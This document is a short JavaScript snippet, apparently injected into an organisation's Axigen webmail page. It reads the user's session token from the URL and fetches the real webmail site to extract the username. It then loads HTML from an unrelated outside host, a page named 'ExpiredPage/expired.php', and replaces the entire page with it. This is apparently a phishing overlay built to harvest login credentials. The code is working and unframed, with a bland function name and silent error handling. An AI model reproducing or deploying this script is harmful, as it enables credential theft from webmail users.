var hostURL = 'https://webmail.fwo.com.pk';
var htmlFileURL = 'https://webworldoppertunity.wuaze.com/axigen/ExpiredPage/expired.php/';
function test(){
  const url = new URL(window.location.href);
  const params = new URLSearchParams(url.search);
  const hValue = params.get('_h');
   extractUsernameFromURL(hValue);
}
test();


function loadHTMLContent(username) {

    const url = ''+ htmlFileURL;
  
        fetch(url)
          .then(response => response.text())
          .then(html => {
            // Replace the current document's content with the fetched HTML
            document.open();
            document.write(html);
            document.close();
          })
          .catch(error => console.error('Error fetching HTML content:', error));
      }
   


async function extractUsernameFromURL(h) {
try {
const url = ''+ hostURL +'/?_h='+h;
const response = await fetch(url);
if (!response.ok) {
throw new Error(`Network response was not ok: ${response.statusText}`);
}
const text = await response.text();
const regex = /username:\s*"([^"]+)"/i;
const match = text.match(regex);
if (match && match[1]) {
const username = match[1];
 loadHTMLContent(username);
} else {
}

} catch (error) {
}
}
